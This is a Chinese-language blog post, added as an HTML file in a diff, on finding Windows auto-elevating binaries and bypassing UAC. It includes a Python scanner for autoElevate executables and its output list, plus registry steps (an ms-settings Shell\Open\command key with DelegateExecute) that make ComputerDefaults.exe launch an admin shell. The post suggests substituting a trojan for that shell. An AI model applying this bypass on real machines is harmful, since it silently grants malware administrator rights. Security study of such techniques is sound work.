@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="什么是UACUAC，全称为User Account Control（用户账户控制），是Windows Vista及后续版本中的一个安全组件。它的设计目的是防止潜在的破坏性操作——特别是那些可能对系统配置产生影响的操作——在不经过管理员授权的情况下执行。 UAC通过在执行可能需要管理员权限的任务时弹出提示窗口，要求用户确认操作或者输入管理员账户的密码，从而实现对可能的危险行为的监控和控制。这个特性使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chensicha‘s blogs">
+<meta property="og:url" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/index.html">
+<meta property="og:site_name" content="Chensicha‘s blogs">
+<meta property="og:description" content="什么是UACUAC，全称为User Account Control（用户账户控制），是Windows Vista及后续版本中的一个安全组件。它的设计目的是防止潜在的破坏性操作——特别是那些可能对系统配置产生影响的操作——在不经过管理员授权的情况下执行。 UAC通过在执行可能需要管理员权限的任务时弹出提示窗口，要求用户确认操作或者输入管理员账户的密码，从而实现对可能的危险行为的监控和控制。这个特性使">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622121843399.png">
+<meta property="og:image" content="http://example.com/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622164747889.png">
+<meta property="og:image" content="http://example.com/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165311813.png">
+<meta property="og:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230623183142614.png">
+<meta property="og:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165530035.png">
+<meta property="og:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165809092.png">
+<meta property="og:image" content="http://example.com/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165919733.png">
+<meta property="og:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622194233641.png">
+<meta property="og:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622195409277.png">
+<meta property="og:image" content="http://example.com/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622200928739.png">
+<meta property="og:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622201650750.png">
+<meta property="og:image" content="http://example.com/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622202206176.png">
+<meta property="og:image" content="http://example.com/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB.gif">
+<meta property="og:image" content="http://example.com/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB-16874925352742.gif">
+<meta property="article:published_time" content="2024-04-29T07:43:25.477Z">
+<meta property="article:modified_time" content="2023-08-26T09:09:52.000Z">
+<meta property="article:author" content="Xiao Ni">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622121843399.png">
+
+<link rel="canonical" href="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Chensicha‘s blogs</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chensicha‘s blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+      <meta itemprop="name" content="Xiao Ni">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chensicha‘s blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h1><p>UAC，全称为User Account Control（用户账户控制），是Windows Vista及后续版本中的一个安全组件。它的设计目的是防止潜在的破坏性操作——特别是那些可能对系统配置产生影响的操作——在不经过管理员授权的情况下执行。</p>
+<p>UAC通过在执行可能需要管理员权限的任务时弹出提示窗口，要求用户确认操作或者输入管理员账户的密码，从而实现对可能的危险行为的监控和控制。这个特性使得恶意软件在未经用户许可的情况下更难以在系统中执行危险的操作，提高了系统的安全性</p>
+<p>8</p>
+<p>在Visual Studio中，你可以通过修改项目的manifest文件来配置User Account Control（用户账户控制，UAC）设置。这个文件是一个XML文件，它定义了应用程序的配置属性，其中一个属性就是UAC设置</p>
+<ul>
+<li><code>asInvoker</code>：这是默认值。当这个值被设置时，应用程序会以启动它的用户的权限运行。如果应用程序被普通用户启动，它将会以普通权限运行；如果应用程序被管理员启动，它将以管理员权限运行。</li>
+<li><code>highestAvailable</code>：当这个值被设置时，应用程序会尽可能地获取最高权限。如果应用程序被管理员启动，它将会以管理员权限运行；如果应用程序被普通用户启动，它将以普通权限运行。</li>
+<li><code>requireAdministrator</code>：当这个值被设置时，应用程序总是以管理员权限运行。如果应用程序被普通用户启动，UAC会弹出一个对话框，要求用户输入管理员账户的密码</li>
+</ul>
+<img src="uac白名单挖掘/image-20230622121843399.png" alt="image-20230622121843399" style="zoom:67%;" />	
+
+
+
+<h1 id="Uac白名单挖掘"><a href="#Uac白名单挖掘" class="headerlink" title="Uac白名单挖掘"></a>Uac白名单挖掘</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>UAC（User Account Control）白名单挖掘是一种常见的权限提升技术，其基本思想是寻找可以在无UAC提示的情况下以管理员权限运行的应用程序。许多这样的程序会对其启动参数进行不够严格的检查，使得攻击者可以通过在启动参数中包含恶意代码，来使得这些程序在启动的同时执行这些恶意代码，从而实现权限提升</p>
+<p>特别地，由于Windows中的许多设置应用程序（例如<code>ComputerDefaults.exe</code>、<code>fodhelper.exe</code>等）在设计时需要考虑到在UAC开启的情况下仍能正常工作，所以它们在manifest文件中常常会设置<code>autoElevate</code>为<code>true</code>，这意味着这些应用程序会在启动时自动提升至管理员权限，而且不会出现UAC提示</p>
+<p>攻击者可能会尝试修改某些注册表键（例如<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>）来劫持这些协议处理程序，以使得当这些应用程序被启动时，他们指定的恶意代码也会被以管理员权限执行，从而实现权限提升。因此，这些键值是UAC白名单挖掘的常见目标</p>
+<h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><ul>
+<li><strong>Sigcheck</strong>工具是一个由Sysinternals提供的命令行实用程序，用于对Windows二进制文件（如.exe，.dll，.sys等）进行签名验证，并显示文件版本信息，证书链等。其下载地址: <a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/Sigcheck">https://download.sysinternals.com/files/Sigcheck</a></li>
+<li><strong>Process Monitor</strong> 是由 Windows Sysinternals 提供的一款高级监视工具，它可以实时监控 Windows 文件系统、注册表和进程&#x2F;线程活动。其下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a></li>
+</ul>
+<h2 id="白名单的筛选条件"><a href="#白名单的筛选条件" class="headerlink" title="白名单的筛选条件"></a>白名单的筛选条件</h2><p>我们正在寻找满足以下几个条件的白名单程序：</p>
+<ul>
+<li>程序的 manifest 文件中的 autoElevate 属性必须配置为 true，这允许程序在无需用户干预的情况下自动获取提升的权限。</li>
+<li>程序执行时不能弹出 UAC（用户账户控制）对话框，这确保了程序的无缝执行，不会因 UAC 对话框的出现而中断用户的工作流。</li>
+<li>程序需要能够查询注册表中的 <code>Shell\Open\command</code> 键。这是因为 <code>shell\open\command</code> 键值通常用于存储特定类型的可执行程序文件路径。当这种特定类型的程序运行时，系统会在注册表中查找并执行对应的 <code>shell\open\command</code> 键值中指定的程序。这一属性允许我们通过改变该键值中的程序路径，将我们所需的程序插入到某些特定的系统操作中</li>
+</ul>
+<h2 id="挖掘步骤"><a href="#挖掘步骤" class="headerlink" title="挖掘步骤"></a>挖掘步骤</h2><h3 id="1-autoElevate值为true"><a href="#1-autoElevate值为true" class="headerlink" title="1.autoElevate值为true"></a>1.<code>autoElevate</code>值为true</h3><p>使用sigcheck工具查看可执行程序的相关信息，如下图所示可以看到名为<code>autoElevate</code>的标签，当其被设置为true时，它表示该应用程序在启动时会自动请求和获取管理员权限，前提是当前的用户账户有管理员权限</p>
+<blockquote>
+<p>Sigcheck工具的-m选项用于显示二进制文件的描绘符。一个描绘符是一个可执行文件或DLL的XML文件，其中包含有关应用程序的信息。这些信息可以包括应用程序的名称，它的版本，它需要的特权等等</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sigcheck64.exe -m C:\windows\system32\ComputerDefaults.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622164747889.png" alt="image-20230622164747889"></p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165311813.png" alt="image-20230622165311813"></p>
+<p>根据以上思路，我们可以使用以下python代码来筛选出可用的白名单程序。此脚本首先获取 <code>C:\\Windows\\System32</code> 目录及其子目录下所有 <code>.exe</code> 文件，然后对每个 <code>.exe</code> 文件检查其是否具有 <code>autoElevate</code> 属性，如果有则将文件名写入到 <code>success.txt</code> 文件中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> subprocess</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">get_exe_files</span><span class="params">(path)</span>:</span></span><br><span class="line"><span class="function">    exe_files =</span> []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files in os.<span class="built_in">walk</span>(path):</span><br><span class="line">        <span class="keyword">for</span> file in files:</span><br><span class="line">            <span class="keyword">if</span> os.path.<span class="built_in">splitext</span>(file)[<span class="number">1</span>] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">                exe_files.<span class="built_in">append</span>(os.path.<span class="built_in">join</span>(root, file))</span><br><span class="line">    <span class="keyword">return</span> exe_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">check_auto_elevate</span>(exe_files):</span><br><span class="line">    success_files = []</span><br><span class="line">    <span class="keyword">for</span> file in exe_files:</span><br><span class="line">        command = r<span class="number">&#x27;.</span>\sigcheck64.exe -m &#123;&#125; | findstr <span class="keyword">auto</span><span class="number">&#x27;.f</span>ormat(file)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = subprocess.<span class="built_in">run</span>(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> in result.stdout.<span class="built_in">decode</span>(<span class="string">&#x27;gb2312&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;&#x27;</span>.format(file))</span><br><span class="line">                success_files.<span class="built_in">append</span>(file)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error when processing file &#123;&#125;: &#123;&#125;&#x27;</span>.format(file, <span class="built_in">str</span>(e)))</span><br><span class="line">    <span class="keyword">return</span> success_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    path = <span class="string">&#x27;C:\\Windows\\System32&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Getting .exe files in &#123;&#125;...&#x27;</span>.format(path))</span><br><span class="line">    exe_files = <span class="built_in">get_exe_files</span>(path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Checking auto elevate property for each file...&#x27;</span>)</span><br><span class="line">    success_files = <span class="built_in">check_auto_elevate</span>(exe_files)</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">&#x27;WhiteList.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> file in success_files:</span><br><span class="line">            f.<span class="built_in">write</span>(<span class="string">&#x27;&#123;&#125;\n&#x27;</span>.format(file))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Done. Found &#123;&#125; files with auto elevate property.&#x27;</span>.format(<span class="built_in">len</span>(success_files)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行上述python代码后，会在其目录下生成一个WhiteList.txt文本文件，用于存放白名单程序的绝对路径，其文本内容如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\bthudtask.exe</span><br><span class="line">C:\Windows\System32\changepk.exe</span><br><span class="line">C:\Windows\System32\ComputerDefaults.exe</span><br><span class="line">C:\Windows\System32\dccw.exe</span><br><span class="line">C:\Windows\System32\dcomcnfg.exe</span><br><span class="line">C:\Windows\System32\DeviceEject.exe</span><br><span class="line">C:\Windows\System32\DeviceProperties.exe</span><br><span class="line">C:\Windows\System32\djoin.exe</span><br><span class="line">C:\Windows\System32\easinvoker.exe</span><br><span class="line">C:\Windows\System32\EASPolicyManagerBrokerHost.exe</span><br><span class="line">C:\Windows\System32\eudcedit.exe</span><br><span class="line">C:\Windows\System32\eventvwr.exe</span><br><span class="line">C:\Windows\System32\fodhelper.exe</span><br><span class="line">C:\Windows\System32\fsquirt.exe</span><br><span class="line">C:\Windows\System32\FXSUNATD.exe</span><br><span class="line">C:\Windows\System32\immersivetpmvscmgrsvr.exe</span><br><span class="line">C:\Windows\System32\iscsicli.exe</span><br><span class="line">C:\Windows\System32\iscsicpl.exe</span><br><span class="line">C:\Windows\System32\lpksetup.exe</span><br><span class="line">C:\Windows\System32\MSchedExe.exe</span><br><span class="line">C:\Windows\System32\msconfig.exe</span><br><span class="line">C:\Windows\System32\msra.exe</span><br><span class="line">C:\Windows\System32\MultiDigiMon.exe</span><br><span class="line">C:\Windows\System32\newdev.exe</span><br><span class="line">C:\Windows\System32\odbcad32.exe</span><br><span class="line">C:\Windows\System32\PasswordOnWakeSettingFlyout.exe</span><br><span class="line">C:\Windows\System32\recdisc.exe</span><br><span class="line">C:\Windows\System32\rrinstaller.exe</span><br><span class="line">C:\Windows\System32\shrpubw.exe</span><br><span class="line">C:\Windows\System32\slui.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesPerformance.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesRemote.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsAdminFlows.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsRemoveDevice.exe</span><br><span class="line">C:\Windows\System32\Taskmgr.exe</span><br><span class="line">C:\Windows\System32\tcmsetup.exe</span><br><span class="line">C:\Windows\System32\TpmInit.exe</span><br><span class="line">C:\Windows\System32\WindowsUpdateElevatedInstaller.exe</span><br><span class="line">C:\Windows\System32\WSReset.exe</span><br><span class="line">C:\Windows\System32\wusa.exe</span><br><span class="line">C:\Windows\System32\Sysprep\sysprep.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里还需注意一点，有个别程序会弹出uac框的，例如changepk.exe，这个程序在windows11不会弹uac，但是在windows10会弹uac</p>
+<img src="uac白名单挖掘/image-20230623183142614.png" alt="image-20230623183142614" style="zoom:67%;" />	
+
+
+
+<h3 id="2-调用Shell-Open-command键"><a href="#2-调用Shell-Open-command键" class="headerlink" title="2.调用Shell\Open\command键"></a>2.调用<code>Shell\Open\command</code>键</h3><p>打开ProcessMonitor捕捉ComputerDefaults.exe的运行信息，在Filter工具栏设置<code>Process Name</code>为<code>ComputerDefaults.exe</code>，<code>Result</code>设置为<code>NAME NOT FOUND</code></p>
+<img src="uac白名单挖掘/image-20230622165530035.png" alt="image-20230622165530035" style="zoom:67%;" />	
+
+<img src="uac白名单挖掘/image-20230622165809092.png" alt="image-20230622165809092" style="zoom:67%;" />	
+
+
+
+<p>随后运行ComputerDeafaults，ProcessMonitor立马会显示关于此程序的相关信息</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165919733.png" alt="image-20230622165919733"></p>
+<p>​			</p>
+<p>注意此路径<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>, 这行的操作是<code>RegQueryKey</code>，表示查询注册表的一个键</p>
+<blockquote>
+<p>在注册表中，键相当于目录，它们可以包含其他键（相当于子目录）或键值（相当于文件）。一个键通常不直接包含数据，数据是存储在键值中的</p>
+</blockquote>
+<img src="uac白名单挖掘/image-20230622194233641.png" alt="image-20230622194233641" style="zoom:67%;" />	
+
+
+
+<p>打开注册表，新建上述的键<code>ms-settings\Shell\Open\command</code></p>
+<img src="uac白名单挖掘/image-20230622195409277.png" alt="image-20230622195409277" style="zoom:67%;" />	
+
+
+
+<p>再用ProcessMonitor捕捉ComputerDefaults的信息，发现它还会去查询<code>DelegateExecute</code>键值，操作为<code>RegQueryValue</code>，表示查询注册表的键值</p>
+<blockquote>
+<p>在注册表中，键值是存储实际数据的地方，例如，可以在一个键值中存储一个字符串、一个数字或一个二进制数据</p>
+</blockquote>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622200928739.png" alt="image-20230622200928739"></p>
+<p>在注册表对应的键中添加个键值为<code>DelegateExecute</code>，并将此目录的默认键值设为<code>cmd.exe</code></p>
+<blockquote>
+<p>Windows注册表中，每个键下面都有一个被称为“默认”或“(默认)”的键值。你可以将其视为该键的默认数据。当你访问一个键而不指定键值的名称时，将返回此默认键值的数据</p>
+</blockquote>
+<img src="uac白名单挖掘/image-20230622201650750.png" alt="image-20230622201650750" style="zoom:67%;" />	
+
+
+
+<p>再次运行ComputerDefaults，会弹出系统管理员权限的cmd，也就是说如果我们将cmd.exe替换成shellcode木马的路径，那么就能获得管理员权限的shell</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622202206176.png" alt="image-20230622202206176"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由此我们可以总结，在执行ComputerDefaults.exe程序之前，系统会首先检查注册表路径<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>是否存在。如果存在，系统将继续搜索同一目录下是否存在DelegateExecute键值对。</p>
+<p>只有在这两个条件都满足的情况下，系统才会执行由<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>路径所指向的exe文件	</p>
+<p>还有一点，为何要找HKCU(HKEY_CURRENT_USER)目录下的键值对呢？因为HKCU下的注册表键值不需要管理员权限。HKCU 包含当前登录用户配置信息，每个用户都有其自己的 HKCU，其中的设置可以被用户自由修改，通常不需要额外的管理员权限</p>
